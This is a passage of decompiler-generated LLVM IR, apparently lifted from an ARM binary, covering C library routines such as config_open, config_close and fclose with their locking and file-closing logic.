  store i32 %v9_1eec0, i32* @r6, align 4
  store i32 %v12_1eec0, i32* @r7, align 4
  store i32 %v15_1eec0, i32* @r8, align 4
  store i32 %v18_1eec0, i32* @sb, align 4
  store i32 %v21_1eec0, i32* @sl, align 4
  store i32 %v24_1eec0, i32* @fp, align 4
  ret i32 %v0_1f1d8

; uselistorder directives
  uselistorder i32 %v0_1f1d8, { 1, 0 }
  uselistorder i32 %v0_1f1c4, { 0, 2, 1 }
  uselistorder i32 %v3_1f1b8, { 1, 0 }
  uselistorder i32 %v2_1f1b8, { 1, 0, 2 }
  uselistorder i32 %v2_1f0fc, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_1f1a4.pre, { 0, 2, 1 }
  uselistorder i32 %v5_1f138, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1f0e4, { 1, 0, 2 }
  uselistorder i1 %v9_1f0c4, { 1, 0 }
  uselistorder i32 %v3_1f09c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1f08c, { 1, 0 }
  uselistorder i1 %v8_1f084, { 1, 0 }
  uselistorder i32 %v3_1f054, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1f044, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v3_1f02c, { 1, 0, 2 }
  uselistorder i32 %v1_1f01c, { 1, 0, 2 }
  uselistorder i32 %v0_1f008, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1f000, { 1, 0 }
  uselistorder i32 %v1_1efec, { 1, 0 }
  uselistorder i32 %v1_1efe8, { 1, 0 }
  uselistorder i32 %v2_1efc4, { 1, 0 }
  uselistorder i32 %v1_1efa8, { 2, 0, 1 }
  uselistorder i32 %v0_1ef90, { 1, 0 }
  uselistorder i32 %v1_1ef80, { 0, 2, 1 }
  uselistorder i32* %v1_1f0f0, { 1, 0 }
  uselistorder i1 %v2_1f098, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1ef0c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1ef00, { 2, 1, 0 }
  uselistorder i32 %v3_1eee8, { 1, 2, 0 }
  uselistorder i32 %v3_1eee4, { 2, 1, 0 }
  uselistorder i32 %v1_1eedc, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i32*, i32)* @realloc, { 0, 2, 1, 3 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1f1d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1f1c0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1f1b0, { 1, 0 }
  uselistorder label %dec_label_pc_1f1a0, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f154, { 1, 0 }
  uselistorder label %dec_label_pc_1ef24.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f0b4, { 1, 0 }
  uselistorder label %dec_label_pc_1f08c, { 1, 0 }
  uselistorder label %dec_label_pc_1f080, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1f044, { 1, 0 }
  uselistorder label %dec_label_pc_1ef78, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_1f1ec = icmp eq i32* %arg1, null
  br i1 %v2_1f1ec, label %dec_label_pc_1f214, label %dec_label_pc_1f1f4

dec_label_pc_1f1f4:                               ; preds = %entry
  %v2_1f1f4 = load i32, i32* %arg1, align 4
  %v1_1f1f8 = inttoptr i32 %v2_1f1f4 to i16*
  %v2_1f1f8 = call i32 @__GI_fclose(i16* %v1_1f1f8)
  %v0_1f1fc = load i32, i32* @r4, align 4
  %v1_1f1fc = add i32 %v0_1f1fc, 20
  %v2_1f1fc = inttoptr i32 %v1_1f1fc to i32*
  %v3_1f1fc = load i32, i32* %v2_1f1fc, align 4
  %v2_1f200 = icmp eq i32 %v3_1f1fc, 0
  br i1 %v2_1f200, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1f1f4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_1f1f4, %bb
  store i32 127500, i32* @lr, align 4
  %v1_1f208 = xor i1 %v2_1f200, true
  call void @__pseudo_cond_branch(i1 %v1_1f208, i32 ptrtoint (i32* @global_var_1c6e8.667 to i32))
  %v0_1f20c = load i32, i32* @r4, align 4
  store i32 %v0_1f20c, i32* @r0, align 4
  %v0_1f210 = call i32 @free()
  br label %dec_label_pc_1f214

dec_label_pc_1f214:                               ; preds = %entry, %bb6
  %v1_1f218 = phi i32 [ 0, %entry ], [ %v0_1f210, %bb6 ]
  ret i32 %v1_1f218

; uselistorder directives
  uselistorder label %dec_label_pc_1f214, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1f228 = load i32, i32* @r4, align 4
  store i32 %v3_1f228, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -34408), i32* @r1, align 4
  %v0_1f230 = call i32 @__GI_fopen()
  store i32 %v0_1f230, i32* %r0.global-to-local, align 4
  store i32 %v0_1f230, i32* @r4, align 4
  %v2_1f234 = icmp eq i32 %v0_1f230, 0
  br i1 %v2_1f234, label %bb, label %dec_label_pc_1f240

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_1f240:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1f248 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_1f248, i32* %r0.global-to-local, align 4
  %v2_1f24c = icmp eq i32 %v2_1f248, 0
  br i1 %v2_1f24c, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_1f240
  %v1_1f250 = load i32, i32* @r4, align 4
  %v3_1f250 = inttoptr i32 %v2_1f248 to i32*
  store i32 %v1_1f250, i32* %v3_1f250, align 4
  %v1_1f258.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_1f240, %bb4
  %v1_1f258 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_1f240 ], [ %v1_1f258.pre, %bb4 ]
  %v2_1f254 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1f254, i32* @r4, align 4
  ret i32 %v1_1f258

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 10, 29, 3, 5, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 2, 9, 4, 8, 7, 6, 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1f264 = load i32, i32* @r4, align 4
  store i32 %v3_1f264, i32* %stack_var_-36, align 4
  %v6_1f264 = load i32, i32* @r5, align 4
  %v9_1f264 = load i32, i32* @r6, align 4
  %v12_1f264 = load i32, i32* @r7, align 4
  %v2_1f268 = add i32 %tmp, 52
  %v3_1f268 = inttoptr i32 %v2_1f268 to i32*
  %v4_1f268 = load i32, i32* %v3_1f268, align 4
  store i32 %v4_1f268, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f270 = icmp eq i32 %v4_1f268, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r8, align 4
  br i1 %v2_1f270, label %dec_label_pc_1f284, label %dec_label_pc_1f2e8

dec_label_pc_1f284:                               ; preds = %entry
  %v0_1f284 = call i32 @__aeabi_read_tp()
  store i32 %v0_1f284, i32* %r0.global-to-local, align 4
  %v0_1f288 = load i32, i32* @r5, align 4
  %v1_1f288 = add i32 %v0_1f288, 64
  %v2_1f288 = inttoptr i32 %v1_1f288 to i32*
  %v3_1f288 = load i32, i32* %v2_1f288, align 4
  store i32 %v3_1f288, i32* %r3.global-to-local, align 4
  %v1_1f28c = add i32 %v0_1f284, -1168
  store i32 %v1_1f28c, i32* @r6, align 4
  %v3_1f290 = icmp uge i32 %v3_1f288, %v1_1f28c
  store i1 %v3_1f290, i1* %cpsr_c.global-to-local, align 1
  %v9_1f290 = icmp eq i32 %v3_1f288, %v1_1f28c
  br i1 %v9_1f290, label %dec_label_pc_1f2dc, label %dec_label_pc_1f298

dec_label_pc_1f298:                               ; preds = %dec_label_pc_1f284
  %v1_1f298 = add i32 %v0_1f288, 56
  store i32 %v1_1f298, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_1f298, i32* %r2.global-to-local, align 4
  %v0_1f2a4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1f2a4, i32* @r4, align 4
  %v1_1f2a8115 = inttoptr i32 %v1_1f298 to i32*
  %v2_1f2a8116 = load i32, i32* %v1_1f2a8115, align 4
  store i32 %v2_1f2a8116, i32* %r3.global-to-local, align 4
  %v3_1f2ac118 = icmp uge i32 %v2_1f2a8116, %v0_1f2a4
  store i1 %v3_1f2ac118, i1* %cpsr_c.global-to-local, align 1
  %v9_1f2ac124 = icmp eq i32 %v2_1f2a8116, %v0_1f2a4
  br i1 %v9_1f2ac124, label %dec_label_pc_1f2b4, label %dec_label_pc_1f2cc

dec_label_pc_1f2b4:                               ; preds = %dec_label_pc_1f298, %dec_label_pc_1f2b4.dec_label_pc_1f2a8_crit_edge
  %v0_1f2b4125 = phi i32 [ %v1_1f2ac.pre, %dec_label_pc_1f2b4.dec_label_pc_1f2a8_crit_edge ], [ %v0_1f2a4, %dec_label_pc_1f298 ]
  store i32 %v0_1f2b4125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f2c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f2c4, label %dec_label_pc_1f2c8, label %dec_label_pc_1f2b4.dec_label_pc_1f2a8_crit_edge

dec_label_pc_1f2b4.dec_label_pc_1f2a8_crit_edge:  ; preds = %dec_label_pc_1f2b4
  %v0_1f2a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f2ac.pre = load i32, i32* @r4, align 4
  %v1_1f2a8 = inttoptr i32 %v0_1f2a8.pre to i32*
  %v2_1f2a8 = load i32, i32* %v1_1f2a8, align 4
  store i32 %v2_1f2a8, i32* %r3.global-to-local, align 4
  %v3_1f2ac = icmp uge i32 %v2_1f2a8, %v1_1f2ac.pre
  store i1 %v3_1f2ac, i1* %cpsr_c.global-to-local, align 1
  %v9_1f2ac = icmp eq i32 %v2_1f2a8, %v1_1f2ac.pre
  br i1 %v9_1f2ac, label %dec_label_pc_1f2b4, label %dec_label_pc_1f2cc

dec_label_pc_1f2c8:                               ; preds = %dec_label_pc_1f2b4
  %v0_1f2c8 = load i32, i32* @r4, align 4
  store i32 %v0_1f2c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f2cc

dec_label_pc_1f2cc:                               ; preds = %dec_label_pc_1f298, %dec_label_pc_1f2b4.dec_label_pc_1f2a8_crit_edge, %dec_label_pc_1f2c8
  %v0_1f2cc = phi i32 [ %v0_1f2c8, %dec_label_pc_1f2c8 ], [ %v2_1f2a8116, %dec_label_pc_1f298 ], [ %v2_1f2a8, %dec_label_pc_1f2b4.dec_label_pc_1f2a8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f2cc = icmp eq i32 %v0_1f2cc, 0
  br i1 %v2_1f2cc, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1f2cc
  %v1_1f2d0 = load i32, i32* @r7, align 4
  store i32 %v1_1f2d0, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1f2cc, %bb
  %v1_1f2d4 = xor i1 %v2_1f2cc, true
  call void @__pseudo_cond_branch(i1 %v1_1f2d4, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1f2d8 = load i32, i32* @r6, align 4
  %v1_1f2d8 = load i32, i32* @r5, align 4
  %v2_1f2d8 = add i32 %v1_1f2d8, 64
  %v3_1f2d8 = inttoptr i32 %v2_1f2d8 to i32*
  store i32 %v0_1f2d8, i32* %v3_1f2d8, align 4
  %v0_1f2dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1f2dc

dec_label_pc_1f2dc:                               ; preds = %dec_label_pc_1f284, %bb41
  %v0_1f2dc = phi i32 [ %v0_1f288, %dec_label_pc_1f284 ], [ %v0_1f2dc.pre, %bb41 ]
  %v1_1f2dc = add i32 %v0_1f2dc, 60
  %v2_1f2dc = inttoptr i32 %v1_1f2dc to i32*
  %v3_1f2dc = load i32, i32* %v2_1f2dc, align 4
  %v1_1f2e0 = add i32 %v3_1f2dc, 1
  store i32 %v1_1f2e0, i32* %r3.global-to-local, align 4
  store i32 %v1_1f2e0, i32* %v2_1f2dc, align 4
  %v0_1f2e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1f2e8

dec_label_pc_1f2e8:                               ; preds = %entry, %dec_label_pc_1f2dc
  %v1_1f2f0 = phi i32 [ %tmp, %entry ], [ %v0_1f2e8.pre, %dec_label_pc_1f2dc ]
  %v1_1f2e8 = inttoptr i32 %v1_1f2f0 to i16*
  %v2_1f2e8 = load i16, i16* %v1_1f2e8, align 2
  %v3_1f2e8 = zext i16 %v2_1f2e8 to i32
  store i32 %v3_1f2e8, i32* %r3.global-to-local, align 4
  %v1_1f2ec = and i32 %v3_1f2e8, 64
  %v2_1f2ec = icmp eq i32 %v1_1f2ec, 0
  br i1 %v2_1f2ec, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_1f2e8
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_1f2e8, %bb42
  %storemerge = phi i32 [ %v1_1f2f0, %bb42 ], [ %v1_1f2ec, %dec_label_pc_1f2e8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 127736, i32* @lr, align 4
  %v1_1f2f4 = xor i1 %v2_1f2ec, true
  call void @__pseudo_cond_branch(i1 %v1_1f2f4, i32 ptrtoint (i32* @global_var_20138.671 to i32))
  %v0_1f2f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1f2f8, i32* %fp.global-to-local, align 4
  %v0_1f2fc = load i32, i32* @r5, align 4
  %v1_1f2fc = add i32 %v0_1f2fc, 4
  %v2_1f2fc = inttoptr i32 %v1_1f2fc to i32*
  %v3_1f2fc = load i32, i32* %v2_1f2fc, align 4
  store i32 %v3_1f2fc, i32* %r0.global-to-local, align 4
  %v1_1f300 = call i32 @__GI___libc_close(i32 %v3_1f2fc)
  store i32 %v1_1f300, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1f308 = load i32, i32* @r8, align 4
  %v2_1f308 = add i32 %v0_1f308, 160
  %v3_1f308 = inttoptr i32 %v2_1f308 to i32*
  %v4_1f308 = load i32, i32* %v3_1f308, align 4
  store i32 %v4_1f308, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1f30c = icmp slt i32 %v1_1f300, 0
  br i1 %v1_1f30c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_1f314 = add i32 %v4_1f308, 8
  %v2_1f314 = inttoptr i32 %v1_1f314 to i32*
  %v3_1f314 = load i32, i32* %v2_1f314, align 4
  store i32 %v3_1f314, i32* %r3.global-to-local, align 4
  %v0_1f318 = call i32 @__aeabi_read_tp()
  store i32 %v0_1f318, i32* %r0.global-to-local, align 4
  %v1_1f31c = add i32 %v0_1f318, -1168
  store i32 %v1_1f31c, i32* %sl.global-to-local, align 4
  %v0_1f320 = load i32, i32* %r3.global-to-local, align 4
  %v3_1f320 = icmp uge i32 %v0_1f320, %v1_1f31c
  store i1 %v3_1f320, i1* %cpsr_c.global-to-local, align 1
  %v9_1f320 = icmp eq i32 %v0_1f320, %v1_1f31c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1f328 = load i32, i32* @r5, align 4
  %v2_1f328 = add i32 %v1_1f328, 4
  %v3_1f328 = inttoptr i32 %v2_1f328 to i32*
  store i32 -1, i32* %v3_1f328, align 4
  br i1 %v9_1f320, label %dec_label_pc_1f370, label %dec_label_pc_1f330

dec_label_pc_1f330:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_1f334 = load i32, i32* @r7, align 4
  store i32 %v0_1f334, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1f33c108 = inttoptr i32 %v0_1f334 to i32*
  %v2_1f33c109 = load i32, i32* %v1_1f33c108, align 4
  store i32 %v2_1f33c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1f340111 = icmp eq i32 %v2_1f33c109, 0
  br i1 %v9_1f340111, label %dec_label_pc_1f348, label %dec_label_pc_1f360

dec_label_pc_1f348:                               ; preds = %dec_label_pc_1f330, %dec_label_pc_1f348.dec_label_pc_1f33c_crit_edge
  %v0_1f348112 = phi i32 [ %v1_1f340.pre, %dec_label_pc_1f348.dec_label_pc_1f33c_crit_edge ], [ 0, %dec_label_pc_1f330 ]
  store i32 %v0_1f348112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f358 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f358, label %dec_label_pc_1f35c, label %dec_label_pc_1f348.dec_label_pc_1f33c_crit_edge

dec_label_pc_1f348.dec_label_pc_1f33c_crit_edge:  ; preds = %dec_label_pc_1f348
  %v0_1f33c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f340.pre = load i32, i32* @r4, align 4
  %v1_1f33c = inttoptr i32 %v0_1f33c.pre to i32*
  %v2_1f33c = load i32, i32* %v1_1f33c, align 4
  store i32 %v2_1f33c, i32* %r3.global-to-local, align 4
  %v3_1f340 = icmp uge i32 %v2_1f33c, %v1_1f340.pre
  store i1 %v3_1f340, i1* %cpsr_c.global-to-local, align 1
  %v9_1f340 = icmp eq i32 %v2_1f33c, %v1_1f340.pre
  br i1 %v9_1f340, label %dec_label_pc_1f348, label %dec_label_pc_1f360

dec_label_pc_1f35c:                               ; preds = %dec_label_pc_1f348
  %v0_1f35c = load i32, i32* @r4, align 4
  store i32 %v0_1f35c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f360

dec_label_pc_1f360:                               ; preds = %dec_label_pc_1f330, %dec_label_pc_1f348.dec_label_pc_1f33c_crit_edge, %dec_label_pc_1f35c
  %v0_1f360 = phi i32 [ %v0_1f35c, %dec_label_pc_1f35c ], [ %v2_1f33c109, %dec_label_pc_1f330 ], [ %v2_1f33c, %dec_label_pc_1f348.dec_label_pc_1f33c_crit_edge ]
  %v1_1f360 = phi i32 [ %v0_1f35c, %dec_label_pc_1f35c ], [ 0, %dec_label_pc_1f330 ], [ %v1_1f340.pre, %dec_label_pc_1f348.dec_label_pc_1f33c_crit_edge ]
  %v3_1f360 = icmp uge i32 %v0_1f360, %v1_1f360
  store i1 %v3_1f360, i1* %cpsr_c.global-to-local, align 1
  %v9_1f360 = icmp eq i32 %v0_1f360, %v1_1f360
  br i1 %v9_1f360, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_1f360
  %v1_1f364 = load i32, i32* @r7, align 4
  store i32 %v1_1f364, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1f360, %bb46
  %v1_1f368 = xor i1 %v9_1f360, true
  call void @__pseudo_cond_branch(i1 %v1_1f368, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1f36c = load i32, i32* %sl.global-to-local, align 4
  %v1_1f36c = load i32, i32* @r7, align 4
  %v2_1f36c = add i32 %v1_1f36c, 8
  %v3_1f36c = inttoptr i32 %v2_1f36c to i32*
  store i32 %v0_1f36c, i32* %v3_1f36c, align 4
  br label %dec_label_pc_1f370

dec_label_pc_1f370:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1f374 = load i32, i32* @r8, align 4
  %v2_1f374 = add i32 %v0_1f374, 160
  %v3_1f374 = inttoptr i32 %v2_1f374 to i32*
  %v4_1f374 = load i32, i32* %v3_1f374, align 4
  store i32 %v4_1f374, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1f37c = add i32 %v0_1f374, 12
  %v3_1f37c = inttoptr i32 %v2_1f37c to i32*
  %v4_1f37c = load i32, i32* %v3_1f37c, align 4
  store i32 %v4_1f37c, i32* %r2.global-to-local, align 4
  %v1_1f380 = add i32 %v4_1f374, 4
  %v2_1f380 = inttoptr i32 %v1_1f380 to i32*
  %v3_1f380 = load i32, i32* %v2_1f380, align 4
  store i32 %v3_1f380, i32* %r1.global-to-local, align 4
  %v1_1f384 = inttoptr i32 %v4_1f37c to i32*
  %v2_1f384 = load i32, i32* %v1_1f384, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f388 = icmp eq i32 %v3_1f380, 0
  %v1_1f38c = add i32 %v2_1f384, 1
  store i32 %v1_1f38c, i32* %r3.global-to-local, align 4
  store i32 %v1_1f38c, i32* %v1_1f384, align 4
  br i1 %v2_1f388, label %dec_label_pc_1f398, label %dec_label_pc_1f3f8

dec_label_pc_1f398:                               ; preds = %dec_label_pc_1f370
  %v0_1f398 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f398 = load i32, i32* %r0.global-to-local, align 4
  %v2_1f398 = add i32 %v1_1f398, 8
  %v3_1f398 = inttoptr i32 %v2_1f398 to i32*
  store i32 %v0_1f398, i32* %v3_1f398, align 4
  %v0_1f39c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1f39c, i32* @r7, align 4
  br label %dec_label_pc_1f3a0

dec_label_pc_1f3a0:                               ; preds = %dec_label_pc_1f3d0.dec_label_pc_1f3a0_crit_edge, %dec_label_pc_1f398
  %v0_1f3a0 = phi i32 [ %v0_1f3a0.pre, %dec_label_pc_1f3d0.dec_label_pc_1f3a0_crit_edge ], [ %v0_1f39c, %dec_label_pc_1f398 ]
  %v1_1f3a0 = inttoptr i32 %v0_1f3a0 to i32*
  %v2_1f3a0 = load i32, i32* %v1_1f3a0, align 4
  store i32 %v2_1f3a0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1f3a0, i32* %r2.global-to-local, align 4
  %v2_1f3ac96 = load i32, i32* %v1_1f3a0, align 4
  store i32 %v2_1f3ac96, i32* %r3.global-to-local, align 4
  %v3_1f3b098 = icmp uge i32 %v2_1f3ac96, %v2_1f3a0
  store i1 %v3_1f3b098, i1* %cpsr_c.global-to-local, align 1
  %v9_1f3b0104 = icmp eq i32 %v2_1f3ac96, %v2_1f3a0
  br i1 %v9_1f3b0104, label %dec_label_pc_1f3b8, label %dec_label_pc_1f3d0

dec_label_pc_1f3b8:                               ; preds = %dec_label_pc_1f3a0, %dec_label_pc_1f3b8.dec_label_pc_1f3ac_crit_edge
  %v0_1f3b8105 = phi i32 [ %v1_1f3b0.pre, %dec_label_pc_1f3b8.dec_label_pc_1f3ac_crit_edge ], [ %v2_1f3a0, %dec_label_pc_1f3a0 ]
  store i32 %v0_1f3b8105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f3c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f3c8, label %dec_label_pc_1f3cc, label %dec_label_pc_1f3b8.dec_label_pc_1f3ac_crit_edge

dec_label_pc_1f3b8.dec_label_pc_1f3ac_crit_edge:  ; preds = %dec_label_pc_1f3b8
  %v0_1f3ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f3b0.pre = load i32, i32* @r4, align 4
  %v1_1f3ac = inttoptr i32 %v0_1f3ac.pre to i32*
  %v2_1f3ac = load i32, i32* %v1_1f3ac, align 4
  store i32 %v2_1f3ac, i32* %r3.global-to-local, align 4
  %v3_1f3b0 = icmp uge i32 %v2_1f3ac, %v1_1f3b0.pre
  store i1 %v3_1f3b0, i1* %cpsr_c.global-to-local, align 1
  %v9_1f3b0 = icmp eq i32 %v2_1f3ac, %v1_1f3b0.pre
  br i1 %v9_1f3b0, label %dec_label_pc_1f3b8, label %dec_label_pc_1f3d0

dec_label_pc_1f3cc:                               ; preds = %dec_label_pc_1f3b8
  %v0_1f3cc = load i32, i32* @r4, align 4
  store i32 %v0_1f3cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f3d0

dec_label_pc_1f3d0:                               ; preds = %dec_label_pc_1f3a0, %dec_label_pc_1f3b8.dec_label_pc_1f3ac_crit_edge, %dec_label_pc_1f3cc
  %v0_1f3d8 = phi i32 [ %v0_1f3cc, %dec_label_pc_1f3cc ], [ %v2_1f3ac96, %dec_label_pc_1f3a0 ], [ %v2_1f3ac, %dec_label_pc_1f3b8.dec_label_pc_1f3ac_crit_edge ]
  %v1_1f3d0 = phi i32 [ %v0_1f3cc, %dec_label_pc_1f3cc ], [ %v2_1f3a0, %dec_label_pc_1f3a0 ], [ %v1_1f3b0.pre, %dec_label_pc_1f3b8.dec_label_pc_1f3ac_crit_edge ]
  %v3_1f3d0 = icmp uge i32 %v0_1f3d8, %v1_1f3d0
  store i1 %v3_1f3d0, i1* %cpsr_c.global-to-local, align 1
  %v9_1f3d0 = icmp eq i32 %v0_1f3d8, %v1_1f3d0
  br i1 %v9_1f3d0, label %dec_label_pc_1f3d8, label %dec_label_pc_1f3d0.dec_label_pc_1f3a0_crit_edge

dec_label_pc_1f3d0.dec_label_pc_1f3a0_crit_edge:  ; preds = %dec_label_pc_1f3d0
  %v0_1f3a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1f3a0

dec_label_pc_1f3d8:                               ; preds = %dec_label_pc_1f3d0
  %v2_1f3d8 = icmp ne i32 %v1_1f3d0, 0
  store i1 %v2_1f3d8, i1* %cpsr_c.global-to-local, align 1
  %v7_1f3dc = icmp slt i32 %v1_1f3d0, 2
  br i1 %v7_1f3dc, label %dec_label_pc_1f3f8, label %dec_label_pc_1f3e0

dec_label_pc_1f3e0:                               ; preds = %dec_label_pc_1f3d8
  %v0_1f3e0 = load i32, i32* @r7, align 4
  store i32 %v0_1f3e0, i32* %r0.global-to-local, align 4
  %v0_1f3e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f3e4 = add i32 %v0_1f3e4, 129
  store i32 %v1_1f3e4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f3f8

dec_label_pc_1f3f8:                               ; preds = %dec_label_pc_1f370, %dec_label_pc_1f3e0, %dec_label_pc_1f3d8
  %v0_1f3f8 = load i32, i32* @r5, align 4
  %v1_1f3f8 = inttoptr i32 %v0_1f3f8 to i16*
  %v2_1f3f8 = load i16, i16* %v1_1f3f8, align 2
  %v3_1f3f8 = zext i16 %v2_1f3f8 to i32
  %v1_1f3fc = and i32 %v3_1f3f8, 24576
  %v1_1f400 = or i32 %v1_1f3fc, 48
  store i32 %v1_1f400, i32* %r3.global-to-local, align 4
  %v0_1f404 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f404 = icmp eq i32 %v0_1f404, 0
  %v1_1f408 = trunc i32 %v1_1f400 to i16
  store i16 %v1_1f408, i16* %v1_1f3f8, align 2
  br i1 %v2_1f404, label %dec_label_pc_1f410, label %dec_label_pc_1f484

dec_label_pc_1f410:                               ; preds = %dec_label_pc_1f3f8
  %v0_1f410 = load i32, i32* @r5, align 4
